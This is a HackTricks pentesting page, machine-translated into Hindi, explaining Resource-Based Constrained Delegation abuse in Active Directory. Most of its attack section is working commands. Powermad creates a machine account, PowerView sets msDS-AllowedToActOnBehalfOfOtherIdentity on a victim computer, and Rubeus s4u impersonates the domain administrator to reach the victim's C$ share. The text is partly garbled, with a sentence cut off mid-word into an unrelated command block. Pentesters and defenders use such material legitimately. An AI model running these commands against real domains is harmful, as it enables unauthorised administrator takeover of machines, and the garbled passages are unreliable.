# संसाधन-आधारित सीमित अधिकार

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks** में विज्ञापित करना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की इच्छा रखते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को PR जमा करके।**

</details>

## संसाधन-आधारित सीमित अधिकार की मूल बातें

यह मूल रूप से [सीमित अधिकार](constrained-delegation.md) की तरह है, लेकिन इसमें किसी **वस्तु** को **किसी सेवा के खिलाफ किसी उपयोगकर्ता का अभिनय करने की अनुमति देने** की बजाय, संसाधन-आधारित सीमित अधिकार निर्धारित करता है कि **कौन संदर्भ में किसी उपयोगकर्ता का अभिनय कर सकता है**।

इस मामले में, सीमित वस्तु में _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ नामक एक गुण होगा, जिसमें उस उपयोगकर्ता का नाम होगा जो उसके खिलाफ किसी अन्य उपयोगकर्ता का अभिनय कर सकता है।

इस सीमित अधिकार से इसके अन्य अधिकारों की तुलना में एक महत्वपूर्ण अंतर यह है कि **किसी मशीन खाते पर लिखने की अनुमति वाले किसी भी उपयोगकर्ता** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **msDS-AllowedToActOnBehalfOfOtherIdentity** को सेट कर सकता है (अन्य अधिकारों के रूप में आपको डोमेन व्यवस्थापक अधिकार चाहिए थे)।

### नए अवधारणाएं

सीमित अधिकार में यह कहा गया था कि उपयोगकर्ता के _userAccountControl_ मान के भीतर _**TrustedToAuthForDelegation**_ ध्वज की आवश्यकता होती है एक **S4U2Self** करने के लिए। लेकिन यह पूर्णतः सच नहीं है।\
वास्तविकता यह है कि उस मान के बिना भी, आप एक **सेवा** (एक SPN होने के साथ) होने की स्थिति में किसी भी उपयोगकर्ता के खिलाफ एक **S4U2Self** कर सकते हैं, लेकिन अगर आपके पास **`TrustedToAuthForDelegation`** ध्वज है तो वापस मिलने वाला TGS **Forwardable** होगा और अगर आपके पास वह ध्वज नहीं है तो वापस मिलने वाला TGS **Forwardable** नहीं होगा।

हालांकि, यदि **S4U2Proxy** में उपयोग किए जाने वाले **TGS** में **Forwardable** नहीं होता है, तो एक **मूल सीमित अधिकार** का दुरुपयोग करने का प्रयास **काम नहीं करेगा**। लेकिन यदि आप **संसाधन-आधारित सीमित अधिकार** का उपयोग करने का प्रयास कर रहे हैं, तो यह काम करेगा (यह कोई संकटन नहीं है, यह एक सुविधा है, जाहिर है)।

### हमला संरचना

> यदि आपके पास किसी **कंप्यूटर** खाते पर **लिखने के समकक्ष अधिकार** हैं, तो आप उस मशीन में **विशेषाधिकार प्राप्त** कर सकते हैं।

मान लें कि हमलावार के पास पहले से ही **विक्टिम कंप्यूटर** पर **लिखने के समकक्ष अधिकार** हैं।

1. हमलावार एक खाता को **संक्रमित** करता है जिसमें एक **SPN** होता है या एक खाता **बनाता है** ("सेवा A")। ध्यान दें कि **कोई भी** _व्यवस्थापक उपयोगकर्ता_ किसी अन्य विशेष अधिकार के बिना तकनीकी अधिकार के रूप में उपयोग कर सकता है तकरीबन 10 **कंप्यू
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### एक कंप्यूटर ऑब्जेक्ट बनाना

आप [powermad](https://github.com/Kevin-Robertson/Powermad) का उपयोग करके डोमेन के अंदर एक कंप्यूटर ऑब्जेक्ट बना सकते हैं**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../.gitbook/assets/b1.png)
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### R**संसाधन-आधारित सीमित अधिकार निर्देशित करना**

**activedirectory PowerShell मॉड्यूल का उपयोग करें**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**पावरव्यू का उपयोग करें**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### पूर्ण S4U हमला करना

सबसे पहले, हमने `123456` पासवर्ड के साथ नया कंप्यूटर ऑब्जेक्ट बनाया है, इसलिए हमें उस पासवर्ड के हैश की आवश्यकता है:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह खाते के लिए RC4 और AES हैश प्रिंट करेगा।
अब, हम हमला कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` पैरामीटर का उपयोग करके केवल एक बार पूछकर अधिक टिकट उत्पन्न कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ध्यान दें कि उपयोगकर्ताओं में "**डेलीगेट नहीं किया जा सकता**" नामक एक गुण होता है। यदि किसी उपयोगकर्ता के पास यह गुण सत्य है, तो आप उसकी अनुकरण नहीं कर पाएंगे। यह गुण bloodhound के अंदर देखा जा सकता है।
{% endhint %}

![](../../.gitbook/assets/B3.png)

### पहुंच

अंतिम कमांड लाइन **पूर्ण S4U हमला करेगा और TGS को विक्टिम होस्ट में मेमोरी में इंजेक्ट करेगा**।\
इस उदाहरण में Administrator से **CIFS** सेवा के लिए एक TGS का अनुरोध किया गया था, इसलिए आप **C$** तक पहुंच सकेंगे।
```bash
ls \\victim.domain.local\C$
```
![](../../.gitbook/assets/b4.png)

### विभिन्न सेवा टिकट का दुरुपयोग करें

[**यहां उपलब्ध सेवा टिकट के बारे में जानें**](silver-ticket.md#available-services).

## केरबेरोस त्रुटियाँ

* **`KDC_ERR_ETYPE_NOTSUPP`**: इसका अर्थ है कि केरबेरोस को डीईएस या आरसी4 का उपयोग नहीं करने के लिए कॉन्फ़िगर किया गया है और आप केवल आरसी4 हैश प्रदान कर रहे हैं। Rubeus को कम से कम AES256 हैश (या बस आरसी4, एएस128 और एएस256 हैश) प्रदान करें। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: इसका अर्थ है कि वर्तमान कंप्यूटर का समय DC के समय से अलग है और केरबेरोस सही तरीके से काम नहीं कर रहा है।
* **`preauth_failed`**: इसका अर्थ है कि दिए गए उपयोगकर्ता नाम + हैश लॉगिन करने के लिए काम नहीं कर रहे हैं। आपने हैश उत्पन्न करते समय उपयोगकर्ता नाम में "$" डालना भूल गए हो सकता है (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: इसका अर्थ हो सकता है:
* आप उस उपयोगकर्ता को अनुकरण नहीं कर सकते हैं जिसका आप अनुकरण करने का प्रयास कर रहे हैं (क्योंकि आप उसे अनुकरण नहीं कर सकते हैं या यह पर्याप्त विशेषाधिकार नहीं है)
* अनुरोधित सेवा मौजूद नहीं है (यदि आप विनर्म के लिए टिकट मांगते हैं लेकिन विनर्म नहीं चल रहा है)
* बनाया गया फेक कंप्यूटर विकल्पी सर्वर पर अपने विशेषाधिकारों को खो चुका है और आपको उन्हें वापस देने की आवश्यकता है।

## संदर्भ

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs के माध्यम से** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को सबमिट करके।**

</details>
